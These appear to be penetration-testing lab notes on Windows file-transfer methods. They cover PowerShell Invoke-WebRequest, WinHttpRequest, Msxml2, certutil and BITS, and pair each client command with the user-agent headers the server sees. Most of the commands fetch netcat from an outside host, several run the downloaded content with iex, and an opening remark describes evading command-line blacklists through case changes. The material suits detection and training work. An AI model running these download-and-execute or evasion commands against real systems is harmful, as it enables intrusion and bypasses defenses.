getting around blacklisting can be as simple as case obfuscation. powershell doesn't care if it's certutil.exe or CerTUTiL.exe but the blacklist does. Whitelisting all command lines in a particular environment takes forever, but is very robust and allows for quick detection and alerting on any unusual command lines

for HTTP and HTTPS you can and should create a whitelist of user agents, again, time consuming but valuable.

##### Invoke-WebRequest - client
```
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -Outfile "C:\Users\Public\nc.exe"
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -Outfile "C:\Users\Public\nc.exe"
```

##### Invoke-WebRequest - Server
```
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0.; en-US) WindowsPowerShell/5.1.14393.0
```

##### WinHttpRequest - Client 
```
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

##### WinHttpRequest - Server
```
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```
##### msxml2 - client
```
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP; 
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false); 
PS C:\htb> $h.send(); 
PS C:\htb> iex $h.responseText
```
##### Msxml2 - Server
```
GET /nc.exe HTTP/1.1 
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (Compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

##### Certutil - Client
```
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

##### Certutil - Server
```
GET /nc.exe HTTP/1.1 
Cache-Control: no-cache 
Connection: Keep-Alive 
Pragma: no-cache 
Accept: */* 
User-Agent: Microsoft-CryptoAPI/10.0 
```

##### BITS - Client
```
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env: temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t;
PS C:\htb> iex $r
```

##### BITS - Server
```
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity 
User-Agent: Microsoft BITS/7.8
```